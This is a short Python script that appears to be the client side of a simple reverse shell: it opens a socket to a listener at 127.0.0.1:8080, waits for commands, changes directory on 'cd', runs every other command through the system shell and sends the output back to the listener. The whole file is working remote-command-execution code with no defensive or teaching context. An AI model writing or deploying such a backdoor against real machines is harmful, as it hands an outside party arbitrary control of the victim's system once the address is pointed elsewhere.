import socket
import os
import subprocess


def send_error(msg):
    err_msg = f'[From client] {msg}'
    client.send(err_msg.encode())


host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    comm = client.recv(1024).decode()
    if comm == 'close':
        break
    elif comm[:3] == 'cd ':
        try:
            os.chdir(comm[3:])
        except FileNotFoundError as e:
            send_error(e)
    else:
        try:
            output = subprocess.check_output(comm, text=True, shell=True)
            if output:
                client.send(output.encode())
            else:
                client.send('not output!'.encode())
        except Exception as e:
            send_error(e)
client.close()
